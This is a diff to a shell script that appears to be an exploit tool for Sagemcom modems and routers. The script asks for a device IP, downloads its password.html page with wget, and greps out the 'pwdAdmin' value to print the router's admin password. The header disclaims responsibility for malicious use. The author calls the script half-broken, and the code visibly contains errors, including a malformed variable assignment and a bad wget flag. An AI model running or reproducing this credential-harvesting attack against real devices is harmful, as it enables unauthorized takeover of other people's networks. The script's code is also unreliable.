@@ -9,15 +9,28 @@
 #   Use at your own risk, and I'm not responsible for any malicious use of this tool
 #       kthx baii <3
 
+#timeday = date +%s
+#clear
+#echo "Please enter the IP of sagemcomm Modem/Router"
+#echo ""
+#read IP_ADDRESS 
+#wget "http://$IP_ADDRESS/password.html" --output-document=/tmp/`$IP_ADDRESS`_`$timeday`.html
+#USER_PASSWORD=`cat /tmp/`$IP_ADDRESS`_`$timeday`.html  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
+#echo "admin password = $USER_PASSWORD"
+
+
+# USER_PASSWORD=`wget http://$IP_ADDRESS/password.html -t 1 -q -O -  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
+
+
+
+# Okay so turns out everything above is halfbroke because they changed the way it works...
+# I'm next revision will be for the new one
+
 timeday = date +%s
 clear
 echo "Please enter the IP of sagemcomm Modem/Router"
 echo ""
 read IP_ADDRESS 
-wget "http://$IP_ADDRESS/password.html" --output-document=/tmp/`$IP_ADDRESS`_`$timeday`.html
-wget http://$IP_ADDRESS/password.html -t 1 -q --output-document=/tmp/`$IP_ADDRESS`_jscript_`$timeday`.html
+wget "http://$IP_ADDRESS/password.html"-quiet --output-document=/tmp/`$IP_ADDRESS`_`$timeday`.html
 USER_PASSWORD=`cat /tmp/`$IP_ADDRESS`_`$timeday`.html  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
 echo "admin password = $USER_PASSWORD"
-
-
-# USER_PASSWORD=`wget http://$IP_ADDRESS/password.html -t 1 -q -O -  | grep "pwdAdmin" | tr " = " "\n" | grep "'" | tr -d "';" `
